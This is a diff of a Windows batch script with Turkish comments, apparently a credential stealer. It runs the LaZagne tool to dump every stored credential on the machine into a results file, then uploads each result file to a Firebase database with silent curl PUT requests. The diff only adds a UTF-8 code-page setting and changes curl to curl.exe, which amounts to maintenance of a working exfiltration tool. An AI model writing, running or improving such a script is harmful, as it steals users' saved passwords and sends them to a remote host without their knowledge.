@@ -50,6 +50,9 @@ if not exist "%RESULT_DIR%" (
 )
 echo [OK] Sonuc klasoru: %RESULT_DIR%
 
+:: Kod sayfasini UTF-8 olarak ayarla
+chcp 65001 >nul
+
 :: LaZagne ile tum credential’lari topla
 echo [INFO] LaZagne calistiriliyor...
 "%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"
@@ -65,7 +68,7 @@ echo [INFO] Sonuclar Firebase'e yukleniyor...
 
 for %%F in ("%RESULT_DIR%\*") do (
     echo   -> Yukleniyor: %%~nxF
-    curl -X PUT -d @%%F "%FIREBASE_URL%/%%~nxF.json" --silent --show-error
+    curl.exe -X PUT -d @%%F "%FIREBASE_URL%/%%~nxF.json" --silent --show-error
     if errorlevel 1 (
         echo [ERROR] %%~nxF yuklenemedi!
         pause
